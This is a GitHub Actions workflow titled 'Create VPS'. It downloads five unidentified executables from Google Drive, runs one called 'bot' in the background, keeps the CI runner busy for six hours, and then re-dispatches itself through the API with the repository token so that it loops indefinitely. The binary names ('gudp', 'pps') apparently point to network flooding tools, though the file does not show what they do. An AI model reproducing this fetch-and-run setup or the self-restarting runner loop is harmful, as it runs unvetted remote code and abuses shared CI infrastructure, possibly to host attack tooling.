name: Create VPS
on:
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]

jobs:
  start-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    env:
      VPS_NAME: ${{ github.event.client_payload.vps_name || 'manual-vps' }}
    steps:
    - name: Checkout
      uses: actions/checkout@v3
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '20'
    - name: Install & Run Bot
      run: |
        sudo su
        sudo apt update -y || echo "‚ö†Ô∏è apt update failed"
        pip install --upgrade pip || echo "‚ö†Ô∏è pip upgrade failed"
        pip install discord gdown flask || echo "‚ö†Ô∏è pip install failed"
        gdown https://drive.google.com/uc?id=1ddcRgVPJ9jhb9gU1v_wPbMIyYIbZzGrI -O bot
        chmod +x bot
        gdown https://drive.google.com/uc?id=1aEI_A_RW8iOGpGbwtyVOjlgzFRnYeP9P -O dns
        chmod +x dns
        gdown https://drive.google.com/uc?id=1ogKs9InlPGrmr-etEeB5YxcScgDoDq9a -O gudp
        chmod +x gudp
        gdown https://drive.google.com/uc?id=19ybxPmtrciess90LhuThG4esmFEDtKIg -O hex
        chmod +x hex
        gdown https://drive.google.com/uc?id=1un2vm7mLMXg6XRr5MjQNshyhH1pNbiFa -O pps
        chmod +x pps      
        echo "üöÄ Starting bot..."
        ./bot &
        echo "‚úÖ Bot is running in background..."
    - name: Keep VPS alive
      run: |
        for i in $(seq 1 360); do
          echo "Running minute $i/360..."
          sleep 60
        done
    - name: Restart workflow
      if: always()
      run: |
        curl -X POST           -H "Accept: application/vnd.github+json"           -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"           -H "Content-Type: application/json"           https://api.github.com/repos/${{ github.repository }}/dispatches           -d '{"event_type": "create-vps"}'
